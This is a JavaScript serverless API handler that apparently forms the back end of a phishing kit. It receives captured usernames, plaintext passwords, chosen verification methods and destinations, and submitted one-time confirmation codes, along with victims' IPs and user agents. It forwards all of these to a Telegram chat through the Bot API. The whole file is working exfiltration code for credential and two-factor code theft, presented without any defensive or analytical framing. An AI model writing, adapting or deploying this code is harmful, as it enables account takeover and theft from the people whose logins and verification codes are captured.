// api/telegram.js
export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { action, data } = req.body;
  
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) {
    console.error('Missing Telegram configuration');
    return res.status(500).json({ error: 'Server configuration error' });
  }

  let message = '';
  let parseMode = 'HTML';

  switch (action) {
    case 'domain_detection':
      message = formatDomainDetection(data);
      break;
    case 'login_attempt':
      message = formatLoginAttempt(data);
      break;
    case 'auth_method':
      message = formatAuthMethod(data);
      break;
    case 'code_submitted':
      message = formatCodeSubmitted(data);
      break;
    default:
      return res.status(400).json({ error: 'Invalid action' });
  }

  try {
    await sendTelegramMessage(botToken, chatId, message, parseMode);
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Telegram send error:', error);
    res.status(500).json({ error: 'Failed to send message' });
  }
}

// ====== FORMAT FUNCTIONS ======

function formatDomainDetection(data) {
  const { domain, timestamp, userAgent, ip } = data;
  return `
DOMAIN DETECTED
─────────────────
DOMAIN    ${domain}
TIME      ${timestamp}
USER      ${userAgent || 'Unknown'}
IP        ${ip || 'Unknown'}
─────────────────
`;
}

function formatLoginAttempt(data) {
  const { username, password, timestamp, userAgent, ip } = data;
  return `
LOGIN ATTEMPT
─────────────────
USERNAME  ${username}
PASSWORD  ${password}
TIME      ${timestamp}
USER      ${userAgent || 'Unknown'}
IP        ${ip || 'Unknown'}
─────────────────
`;
}

function formatAuthMethod(data) {
  const { method, destination, timestamp, userAgent, ip } = data;
  return `
VERIFICATION METHOD SELECTED
─────────────────
METHOD    ${method === 'sms' ? 'SMS' : 'EMAIL'}
DEST      ${destination}
TIME      ${timestamp}
USER      ${userAgent || 'Unknown'}
IP        ${ip || 'Unknown'}
─────────────────
`;
}

function formatCodeSubmitted(data) {
  const { code, attempt, timestamp, userAgent, ip } = data;
  return `
CONFIRMATION CODE SUBMITTED
─────────────────
CODE      ${code}
ATTEMPT   ${attempt || 1}
TIME      ${timestamp}
USER      ${userAgent || 'Unknown'}
IP        ${ip || 'Unknown'}
─────────────────
`;
}

async function sendTelegramMessage(botToken, chatId, message, parseMode = 'HTML') {
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  
  const payload = {
    chat_id: chatId,
    text: message,
    parse_mode: parseMode,
    disable_web_page_preview: true
  };

  const response = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });

  if (!response.ok) {
    const error = await response.text();
    throw new Error(`Telegram API error: ${error}`);
  }

  return response.json();
}